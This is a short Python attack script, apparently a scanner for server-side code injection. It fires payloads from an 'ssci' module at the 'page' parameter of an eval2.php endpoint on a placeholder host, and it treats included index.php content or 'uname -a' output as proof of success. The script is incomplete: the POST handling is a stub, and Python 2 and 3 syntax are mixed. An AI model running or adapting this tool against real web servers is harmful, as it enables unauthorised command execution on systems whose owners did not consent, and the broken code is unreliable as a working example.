import requests
import ssci

BASE_URL = "http://target.com/"

def injectPayload(url, paramname, method, payload):
	#finds index.php at base
	parsedURL = BASE_URL + url	
	html = ""	
	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload
		content = requests.get(getURL)
		html =  content.text
		#instead of printing, i want to return the payload if true!

	#if post
	elif method == "POST":
		print("POST")

	result = checkSuccess(html)
	if result is not None:
		print result, payload
def checkSuccess(html):
#server side injection:
	#included index.php
	indexPHP = requests.get(BASE_URL + "index.php")
	if indexPHP.text in html:
		return "SSCI"
	#uname -a successful:
	if "GNU/Linux" in html:
		return "SSCI"

	return None;
	

if __name__ == "__main__":
	
	url = "/serverside/eval2.php"
	payloads = ssci.get_all(url)
	
	for payload in payloads:
		injectPayload(url, "page", "GET", payload)
